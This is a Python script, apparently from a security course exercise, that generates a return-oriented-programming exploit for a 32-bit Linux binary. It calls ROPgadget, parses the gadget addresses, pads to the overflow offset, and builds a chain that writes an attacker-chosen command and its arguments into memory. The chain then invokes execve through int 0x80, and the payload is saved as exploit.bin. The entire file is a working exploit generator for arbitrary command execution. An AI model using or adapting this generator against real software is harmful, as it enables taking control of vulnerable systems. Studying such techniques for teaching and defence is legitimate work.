import sys, os,subprocess,re
from struct import pack
from getPadding import get_padding

# globals
ROP_PATH =  'ROPgadget'
ROP_OUT =  'out-rop.txt'
FILE = sys.argv[1]  # the file you want to attack
COMMAND = sys.argv[2] # the file storing an arbitrary command

# call ROPgadget to generate ROP chain
bashCommand = f"{ROP_PATH} --binary {FILE} --ropchain"
print(f"executing command: {bashCommand}")
with open(ROP_OUT, "w") as rop_out:
    subprocess.call(bashCommand.split(), stdout=rop_out)

# initailize basic gadgets
STACK_ADDRESS = 0x080d9060
STACK      = pack("<I", 0x080d9060) # @ .data 
INT80      = pack("<I", 0x080495f3) # int $0x80
MOVISTACK  = pack("<I", 0x08056cf5) # mov dword ptr [edx], eax ; ret
INCEAX     = pack("<I", 0x0807b6da) # inc %eax | ret 
POPEAX     = pack("<I", 0x080a89e6) # pop %eax | ret
POPEBX     = pack("<I", 0x080481c9) # pop %ebx | ret
POPECX     = pack("<I", 0x0806e262) # pop %ecx | ret
POPEDX     = pack("<I", 0x0806e23b) # pop %edx | ret

XOREAX     = pack("<I", 0x080562b0) # xor %eax,%eax | ret
DUMMY      = pack("<I", 0x42424242) # padding

# accomodate all found gadgets
with open(ROP_OUT) as rop_out_file:
    for line in rop_out_file:
         # analyze the gadget type
        if 'Gadget found' in line:
            print(line)
            a = line.split(" ")
            if 'mov dword' in line:
                print(a[3], "MOVISTACK")
                MOVISTACK = pack("<I", int(a[3], 16))
            elif 'xor eax, eax' in line:
                print(a[3], "XOREAX")
                XOREAX = pack("<I", int(a[3], 16))
            elif 'inc eax ; ret' in line:
                print(a[3], "INCEAX")
                INCEAX = pack("<I", int(a[3], 16))
            elif 'pop eax ; ret' in line:
                print(a[3], "POPEAX")
                POPEAX = pack("<I", int(a[3], 16))
            elif 'pop ecx ; pop ebx ; ret' in line:
                print(a[3], "POPECX")
                POPECX = pack("<I", int(a[3], 16))
            elif 'pop ebx ; ret' in line:
                print(a[3], "POPEBX")
                POPEBX = pack("<I", int(a[3], 16))
            elif 'pop ecx ; ret' in line:
                print(a[3], "POPECX")   
                POPECX = pack("<I", int(a[3], 16))
            elif 'pop edx ; ret' in line:
                print(a[3], "POPEDX") 
                POPEDX = pack("<I", int(a[3], 16))
            elif 'int 0x80' in line:
                print(a[3], "INT80") 
                INT80 = pack("<I", int(a[3], 16))
        # find the stack address
        elif '@ .data\n' in line:
            a = re.split(" |\)", line)
            print(a[3], "STACK")
            STACK_ADDRESS = int(a[3], 16)
            STACK = pack("<I", int(a[3], 16))

# find the padding length
padding_length = get_padding(FILE)
print("The padding length: ", padding_length)
outfile=open("exploit.bin", "wb")
p = b'A'*padding_length # this is where we appended 44 characters.

#read the arbitrary commands
commands = []
with open(COMMAND) as commands_file:
    commands = commands_file.readline().split(" ")
OFFSET = 0
OFFSET_LIST = []
COMMAND_LEN = len(commands)
print("commands:", commands)
print("commands length:", COMMAND_LEN)

#insert commands
for i in range(COMMAND_LEN):
    command = commands[i]
    command_bytes = [command[i:i+4] for i in range(0, len(command), 4)]
    OFFSET_LIST.append(OFFSET)
    for command_byte in command_bytes:
        # split any argument longer than 4 chars into chunks of 4
        # if the length of any chunk is shorter than 4
        # then we have to extend it to length 4 by adding null byte
        insert_command = command_byte
        if len(command_byte) < 4:
            insert_command += ' '*(4 - len(command_byte))
        
        print(f"insert: '{insert_command}' OFFSET: {OFFSET}")
        p += POPEDX # pop edx ; ret
        p += pack('<I', STACK_ADDRESS + OFFSET)
        p += POPEAX # pop eax ; ret
        p += insert_command.encode('utf-8')
        p += MOVISTACK # mov dword ptr [edx], eax ; ret
        if len(command_byte) < 4: 
            # insert null byte for every short argument
            p += POPEDX # pop edx ; ret
            p += pack('<I', STACK_ADDRESS + OFFSET + len(command_byte)) 
            p += XOREAX
            p += MOVISTACK
            OFFSET += len(command_byte) + 1 # leave one more null byte
        else:
            OFFSET += 4
    #insert null
    print(f"insert: 'null' OFFSET: {OFFSET}")
    p += POPEDX #insert null
    p += pack('<I', STACK_ADDRESS + OFFSET)
    p += XOREAX
    p += MOVISTACK
    OFFSET += 1

#set the null offset
NULL_OFFSET = OFFSET - 1

print("The offset of commands:", OFFSET_LIST)

#insert args
if OFFSET < 20:
    OFFSET = OFFSET + 39
else:
    OFFSET = OFFSET + 19 #+8 address since last null
ARGS_OFFSET = OFFSET 
for i in range(COMMAND_LEN):
    print("args: '%s' OFFSET: %d COMMAND_OFFSET: %d" % (commands[i], OFFSET, OFFSET_LIST[i]))
    p += POPEDX # pop edx ; ret
    p += pack('<I', STACK_ADDRESS + OFFSET)
    p += POPEAX # pop eax ; ret
    p += pack('<I', STACK_ADDRESS + OFFSET_LIST[i])
    p += MOVISTACK # mov dword ptr [edx], eax ; ret
    OFFSET += 4

# initialize all registors 
p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + NULL_OFFSET) # @ .data + NULL_OFFSET, point ot null
p += XOREAX # xor eax, eax ; ret
p += MOVISTACK # mov dword ptr [edx], eax ; ret

# set ebx
print(f"set ebx: stack + 0")
p += POPEBX # pop ebx ; ret
p += STACK # @ .data

# set ecx to arg
print(f"set ecx: stack + {ARGS_OFFSET}")
p += POPECX # pop ecx ; ret
p += pack('<I', STACK_ADDRESS + ARGS_OFFSET) # @ .data + ARGS_OFFSET, point ot args
p += pack('<I', STACK_ADDRESS) # padding without overwrite ebx

# set edx to NULL
print(f"set edx: stack + {NULL_OFFSET}")
p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + NULL_OFFSET) # @ .data + NULL_OFFSET, point ot null

# set eax to 11
print(f"set eax: 11")
p += INCEAX * 11
p += INT80 # int 0x80
outfile.write(p)
outfile.close()

print("Genrate exploit.bin successfully!")
